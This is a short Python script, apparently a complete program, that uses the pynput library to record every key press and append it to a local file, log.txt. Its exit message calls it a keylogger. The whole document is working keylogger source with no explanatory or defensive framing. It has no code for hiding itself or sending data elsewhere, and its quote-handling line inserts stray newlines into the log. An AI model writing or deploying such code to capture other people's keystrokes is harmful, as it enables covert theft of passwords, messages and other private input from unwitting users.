from pynput.keyboard import Listener
import sys

def loop(key):
    keydata = str(key)
    keydata = keydata.replace("'", "\n")  # Fix the replace operation
    if keydata == 'Key.space':
        keydata = ' '
    if keydata == 'Key.shift_r':
        keydata = ''
    if keydata == "Key.ctrl_l":
        keydata = ""
    if keydata == "Key.enter":
        keydata = "\n"
    with open("log.txt", "a") as file:
        file.write(keydata)

with Listener(on_press=loop) as l:
    try:
        l.join()
    except KeyboardInterrupt:
        # Handle the KeyboardInterrupt, you can add code to do any cleanup here
        print("Keylogger terminated.")
